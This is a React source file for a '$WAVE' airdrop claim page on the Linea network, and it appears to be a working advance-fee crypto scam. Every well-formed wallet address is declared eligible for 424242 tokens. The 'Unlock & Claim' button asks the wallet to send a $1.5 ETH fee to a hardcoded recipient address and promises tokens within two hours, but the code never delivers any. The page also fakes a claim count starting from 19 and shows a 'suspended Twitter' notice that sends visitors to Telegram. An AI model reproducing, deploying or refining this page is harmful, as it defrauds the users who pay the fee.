'use client';

import { useState, useEffect } from "react";
import { Copy, Check } from "lucide-react";

// Ethereum window type
declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: any[] }) => Promise<any>;
      on: (event: string, callback: (accounts: string[]) => void) => void;
      removeListener: (event: string, callback: (accounts: string[]) => void) => void;
      isMetaMask?: boolean;
      isCoinbaseWallet?: boolean;
    }
  }
}

const CONTRACT_ADDRESS = "0x00000a1fF7eD21721dB7cb07efF523aBb2A00000";
const LINEA_CHAIN_ID = "0xe708";
const PAYMENT_RECIPIENT = "0x2e1a15553476e8f490b555675e2fbd9f5a06a174";
const isValidContractAddress = CONTRACT_ADDRESS !== "0xYOUR_CONTRACT_ADDRESS" && CONTRACT_ADDRESS.length === 42;

// Helper ethereum address validator
function isValidEthereumAddress(address: string) {
  return /^0x[a-fA-F0-9]{40}$/.test(address.trim());
}

interface AirdropPageProps {
  isConnected: boolean;
  connectedAddress: string;
  connectWallet: () => Promise<void>;
  disconnectWallet: () => void;
  isConnecting: boolean;
}

// ETH price fetch for fee calculation
const fetchEthPriceUSD = async (): Promise<number> => {
  try {
    const response = await fetch(
      "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"
    );
    const data = await response.json();
    return data.ethereum.usd;
  } catch {
    return 2500;
  }
};

export default function AirdropPage({
  isConnected,
  connectedAddress,
  connectWallet,
  disconnectWallet,
  isConnecting,
}: AirdropPageProps) {
  const [totalClaimed, setTotalClaimed] = useState(0);
  const [walletAddress, setWalletAddress] = useState("");
  const [checkResult, setCheckResult] = useState<"eligible" | "ineligible" | null>(null);
  const [isChecking, setIsChecking] = useState(false);
  const [hasClaimed, setHasClaimed] = useState(false);
  const [isClaiming, setIsClaiming] = useState(false);
  const [claimStatus, setClaimStatus] = useState<{
    step: "idle" | "payment" | "success" | "failed";
    message: string;
    paymentHash?: string;
  }>({ step: "idle", message: "" });
  const [showConnectModal, setShowConnectModal] = useState(false);
  const [copied, setCopied] = useState(false);
  const [showClaimNotOpenModal, setShowClaimNotOpenModal] = useState(false);
  const [txnCount, setTxnCount] = useState<number | null>(null);
  const [showSiteNoticeModal, setShowSiteNoticeModal] = useState(true);

  // Eligible checked wallets state
  const [eligibleWallets, setEligibleWallets] = useState<string[]>([]);

  // ------ AIRDROP STATS FROM LINEASCAN ------
  useEffect(() => {
    fetchTotalClaims();
  }, []);

  // Always start totalClaimed from 19, add each new successful paid transaction
  const fetchTotalClaims = async () => {
    try {
      const apiUrl = `https://api.lineascan.build/api?module=account&action=txlist&address=${PAYMENT_RECIPIENT}&startblock=0&endblock=99999999&page=1&offset=2000&sort=asc`;
      const res = await fetch(apiUrl);
      if (!res.ok) throw new Error("Network error");
      const data = await res.json();
      if (!data.result || !Array.isArray(data.result)) {
        setTotalClaimed(19);
        return;
      }
      // Only successful, fee-paid txs sent to PAYMENT_RECIPIENT
      const claimsArr = data.result.filter((tx: any) =>
        tx.to?.toLowerCase() === PAYMENT_RECIPIENT.toLowerCase()
          && tx.isError === "0"
          && Number(tx.gasUsed) > 0
      );
      const userPrepaidCount = 19;
      const claimsCount = userPrepaidCount + claimsArr.length;
      setTotalClaimed(claimsCount);
    } catch {
      setTotalClaimed(19);
    }
  };

  // ------ AIRDROP ELIGIBILITY ------
  const checkAirdrop = async () => {
    const addressToCheck = walletAddress.trim() || connectedAddress;
    if (!addressToCheck) return;
    setHasClaimed(false);
    setClaimStatus({ step: "idle", message: "" });
    setIsChecking(true);
    setCheckResult(null);
    setTxnCount(null);

    const normalizedAddress = addressToCheck.trim();
    if (!isValidEthereumAddress(normalizedAddress)) {
      setCheckResult("ineligible");
      setIsChecking(false);
      return;
    }
    try {
      setCheckResult("eligible");
      setTxnCount(null);
      setEligibleWallets((prev) =>
        prev.includes(normalizedAddress)
          ? prev
          : [...prev, normalizedAddress]
      );
    } catch (err) {
      setCheckResult("ineligible");
      setTxnCount(null);
    }
    setIsChecking(false);
  };

  // ------ CLAIM ------
  const handleUnlockAndClaim = async () => {
    setIsClaiming(true);
    setClaimStatus({ step: "payment", message: "Requesting payment via MetaMask..." });
    try {
      const fromAddress = connectedAddress;
      if (!fromAddress || !window.ethereum) {
        setClaimStatus({
          step: "failed",
          message: "Wallet not connected or MetaMask unavailable.",
        });
        setIsClaiming(false);
        return;
      }
      const ethPriceUSD = await fetchEthPriceUSD();
      const paymentUSD = 1.5;
      const ethAmount = paymentUSD / ethPriceUSD;
      const weiAmount = `0x${Math.floor(ethAmount * 1e18).toString(16)}`;

      const txParams = {
        from: fromAddress,
        to: PAYMENT_RECIPIENT,
        value: weiAmount,
      };

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txParams],
      });

      setClaimStatus({
        step: "success",
        message: "Fee sent, you will receive your airdrop within 2 hours.",
        paymentHash: txHash,
      });
      setHasClaimed(true);
    } catch (error: any) {
      setClaimStatus({
        step: "failed",
        message: "Transaction failed or rejected.",
      });
    }
    setIsClaiming(false);
  };

  // ------ CLIPBOARD -------
  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(walletAddress);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {}
  };

  // ------ WALLET ------
  const handleConnectWallet = () => {
    setShowConnectModal(true);
  };

  const handleModalConnect = async () => {
    setShowConnectModal(false);
    await connectWallet();
  };

  // ------ UI -------
  return (
    <div className="relative min-h-screen overflow-hidden">
      <div className="fixed inset-0 bg-gradient-to-br from-slate-900 via-blue-900 to-slate-800">
        <div className="absolute inset-0 opacity-30">
          <div
            className="absolute inset-0"
            style={{
              backgroundImage: `radial-gradient(circle, #3b82f6 1px, transparent 1px)`,
              backgroundSize: "40px 40px",
              backgroundPosition: "0 0, 20px 20px",
            }}
          ></div>
        </div>
      </div>
      <div className="relative z-10 flex flex-col items-center justify-center text-white px-4 py-8 min-h-screen">
        <div className="w-full max-w-md mb-8" />
        <div className="mb-8"></div>
        <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 bg-clip-text text-transparent animate-pulse">
          $WAVE
        </h1>
        <p className="text-lg md:text-xl text-blue-100 mb-8 text-center">Check your wallet eligibility for $WAVE</p>
        <div className="mb-6">
          {!isConnected ? (
            <button
              onClick={handleConnectWallet}
              disabled={isConnecting}
              className="px-6 py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 disabled:bg-blue-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 backdrop-blur-sm border border-blue-300/20 glow-button"
            >
              {isConnecting ? "Connecting..." : "Connect Wallet"}
            </button>
          ) : (
            <div className="flex items-center gap-3">
              <div className="px-4 py-2 bg-green-500/20 rounded-lg border border-green-300/30">
                <span className="text-green-100 text-sm">
                  Connected: {connectedAddress && connectedAddress.slice(0, 6)}...{connectedAddress && connectedAddress.slice(-4)}
                </span>
              </div>
              <button
                onClick={disconnectWallet}
                className="px-4 py-2 bg-red-500/20 hover:bg-red-500/30 rounded-lg text-red-100 text-sm transition-colors duration-200"
              >
                Disconnect
              </button>
            </div>
          )}
        </div>
        <div className="w-full max-w-md mb-12 space-y-4">
          <div className="space-y-2">
            <div className="relative">
              <input
                type="text"
                placeholder={
                  isConnected ? "Leave empty to check connected wallet" : "Enter wallet address to check eligibility"
                }
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
                className="w-full px-4 py-3 pr-12 bg-blue-400/20 border border-blue-300/30 rounded-lg placeholder-blue-200 text-white backdrop-blur-sm focus:outline-none focus:border-blue-300/50 shadow-lg shadow-black/20"
              />
              {walletAddress && (
                <button
                  onClick={copyToClipboard}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 p-1 hover:bg-blue-500/20 rounded transition-colors duration-200"
                >
                  {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-blue-300" />}
                </button>
              )}
            </div>
          </div>
          <button
            onClick={checkAirdrop}
            disabled={(!walletAddress.trim() && !connectedAddress) || isChecking}
            className="w-full py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 disabled:bg-blue-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 backdrop-blur-sm border border-blue-300/20 glow-button"
          >
            {isChecking ? "Checking..." : "Check Airdrop"}
          </button>
          {checkResult && (
            <div
              className={`p-4 rounded-lg backdrop-blur-sm border ${
                checkResult === "eligible"
                  ? "bg-green-500/20 border-green-300/30 text-green-100"
                  : "bg-red-500/20 border-red-300/30 text-red-100"
              }`}
            >
              <div className="text-center">
                <div className="text-lg font-semibold mb-2">
                  {checkResult === "eligible" ? "✅ Eligible" : "❌ Not Eligible"}
                </div>
                <div className="text-sm">
                  {checkResult === "eligible"
                    ? "Your wallet is eligible for 424242 $WAVE!"
                    : "Your wallet is not eligible for this airdrop."}
                </div>
                {txnCount !== null && (
                  <div className="text-xs text-blue-300 mt-2">
                    Transaction count on Linea: {txnCount}
                  </div>
                )}
                {checkResult === "eligible" && !hasClaimed && (
                  <div className="mt-4 space-y-2">
                    <div className="text-xs text-green-200 mb-2">
                      Claim process: Unlock Airdrop ($1.5 fee payment ) ➧ your $WAVE tokens will be automatically airdropped to your wallet in 2-hour batches.
                    </div>
                    <button
                      onClick={handleUnlockAndClaim}
                      disabled={isClaiming || !isConnected}
                      className="px-6 py-2 bg-green-500 hover:bg-green-400 hover:shadow-lg hover:shadow-green-400/50 disabled:bg-green-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 glow-button"
                    >
                      {isClaiming ? "Processing..." : "Unlock & Claim"}
                    </button>
                  </div>
                )}
                {hasClaimed && (
                  <div className="mt-3 text-green-200 font-semibold">
                    ✅ Fee Payment Sent! You have already claimed.
                  </div>
                )}
                {claimStatus.step !== "idle" && (
                  <div
                    className={`mt-4 p-3 rounded-lg text-sm ${
                      claimStatus.step === "success"
                        ? "bg-green-500/20 border border-green-300/30 text-green-100"
                        : claimStatus.step === "failed"
                          ? "bg-red-500/20 border border-red-300/30 text-red-100"
                          : "bg-blue-500/20 border border-blue-300/30 text-blue-100"
                    }`}
                  >
                    <div className="font-semibold mb-2">
                      {claimStatus.step === "payment" && "💳 Payment Step"}
                      {claimStatus.step === "success" && "✅ Success!"}
                      {claimStatus.step === "failed" && "❌ Failed"}
                    </div>
                    <div>{claimStatus.message}</div>
                    {claimStatus.paymentHash && (
                      <div className="mt-2 text-xs">
                        Payment TX: {claimStatus.paymentHash.slice(0, 10)}...{claimStatus.paymentHash.slice(-8)}
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
        <div className="text-center space-y-6">
          <div className="text-blue-200 text-sm uppercase tracking-wider">AIRDROP STATS</div>
          <div className="inline-block p-6 rounded-xl bg-slate-900/50 backdrop-blur-md border-2 border-gold/50 shadow-lg shadow-gold/20 glow-border">
            <div className="text-4xl md:text-5xl font-bold text-grey glow-text">{totalClaimed}</div>
            <div className="text-lg text-blue-200 mt-2">
              CLAIM OPEN
            </div>
          </div>
        </div>
        {showSiteNoticeModal && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50">
            <div className="bg-white border-2 border-blue-500 rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl flex flex-col items-center relative">
              <span className="absolute top-3 right-3">
                <button
                  onClick={() => setShowSiteNoticeModal(false)}
                  className="p-1 px-3 bg-blue-500/80 text-white rounded-full text-lg font-bold hover:bg-blue-700 transition shadow shadow-blue-400"
                  title="Close Notice"
                >
                  ✕
                </button>
              </span>
              <h3 className="text-2xl font-extrabold mb-3 text-center text-blue-800">
                $WAVE CLAIM IS OPEN
              </h3>
              <div className="bg-blue-500/10 border border-blue-400/20 px-4 py-3 rounded-lg mb-3 text-base text-blue-900 text-center font-semibold shadow">
                Notice: Our Twitter/X has been <strong>suspended</strong> due to a huge number of WAVE point farmers continuously mentioning and tagging us for earning $WAVE.
              </div>
              <div className="text-slate-800 font-normal text-center leading-relaxed mb-2">
                Please join our <a href="https://t.me/Lineawaves" target="_blank" rel="noopener noreferrer" className="text-blue-700 underline font-bold">Telegram</a> while we get back our Twitter.
              </div>
              <div className="mt-2 text-blue-600 text-xs text-center italic">
                Stay safe! Do not trust Twitter links unless officially posted here.
              </div>
            </div>
          </div>
        )}
        {showClaimNotOpenModal && (
          <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50">
            <div className="bg-white border border-blue-500 rounded-xl p-8 max-w-sm w-full mx-4 shadow-2xl flex flex-col items-center">
              <h3 className="text-xl font-bold text-center mb-3 text-blue-700">
                Unlock &amp; Claim Unavailable
              </h3>
              <p className="text-gray-700 text-center text-base">
                Claiming is not open at this time.<br />
                Please check back for future updates.
              </p>
            </div>
          </div>
        )}
        {showConnectModal && (
          <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
            <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-sm w-full mx-4 shadow-2xl">
              <h3 className="text-xl font-bold text-center mb-4 text-gold">
                Connect Your Wallet
              </h3>
              <p className="text-blue-200 text-center mb-6 text-sm">
                Connect your wallet to check eligibility and claim your airdrop
              </p>
              <div className="flex gap-3">
                <button
                  onClick={handleModalConnect}
                  disabled={isConnecting}
                  className="flex-1 py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 disabled:bg-blue-600/50 disabled:cursor-not-allowed rounded-lg font-semibold transition-all duration-300 backdrop-blur-sm border border-blue-300/20"
                >
                  {isConnecting ? "Connecting..." : "Connect"}
                </button>
                <button
                  onClick={() => setShowConnectModal(false)}
                  className="flex-1 py-3 bg-slate-600/50 hover:bg-slate-600/70 rounded-lg font-semibold transition-colors duration-200"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}
        {!isValidContractAddress && (
          <div className="fixed top-4 left-4 right-4 bg-yellow-500/20 border border-yellow-300/30 rounded-lg p-3 text-yellow-100 text-sm backdrop-blur-sm">
              ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Linea contract address.
            </div>
        )}
      </div>
      <style jsx>{`
        .text-gold {
          color: #ffd700;
        }
        .glow-text {
          text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700, 0 0 30px #ffd700;
        }
        .glow-button:hover:not(:disabled) {
          box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
        }
        .glow-border {
          box-shadow: 0 0 20px rgba(255, 215, 0, 0.3), inset 0 0 20px rgba(255, 215, 0, 0.1);
        }
        .border-gold {
          border-color: #ffd700;
        }
        @keyframes float {
          0%, 100% { transform: translateY(0px) rotate(0deg); }
          50% { transform: translateY(-10px) rotate(5deg); }
        }
        @keyframes float-delayed {
          0%, 100% { transform: translateY(0px) rotate(0deg); }
          50% { transform: translateY(-15px) rotate(-5deg); }
        }
        @keyframes bounce-slow {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-8px); }
        }
        .animate-float {
          animation: float 4s ease-in-out infinite;
        }
        .animate-float-delayed {
          animation: float-delayed 5s ease-in-out infinite 1s;
        }
        .animate-bounce-slow {
          animation: bounce-slow 3s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
}
